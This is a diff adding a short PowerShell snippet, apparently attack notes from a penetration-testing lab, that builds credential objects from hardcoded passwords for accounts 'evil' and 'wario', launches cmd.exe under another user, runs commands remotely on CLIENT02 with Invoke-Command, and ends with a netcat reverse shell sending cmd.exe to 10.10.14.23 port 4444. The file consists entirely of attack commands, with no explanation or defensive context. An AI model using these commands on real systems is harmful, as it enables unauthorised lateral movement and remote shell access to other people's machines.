@@ -1,0 +1,21 @@
+$secpasswd = ConvertTo-SecureString "Ev!lpass" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("evil", $secpasswd)
+
+
+$secpasswd = ConvertTo-SecureString "Mushroom!" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("wario", $secpasswd)
+
+
+
+$computer = "workstation7"
+[System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe","", $mycreds.Username, $mycreds.Password, 'CLIENT02')
+
+
+
+
+
+
+$password = convertto-securestring -AsPlainText -Force -String "Ev!lpass";
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "wario",$password;
+Invoke-Command -ComputerName 'CLIENT02' -ScriptBlock { c:\windows\system32\cmd.exe } -credential $credential; 
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 4444} -credential $credential;
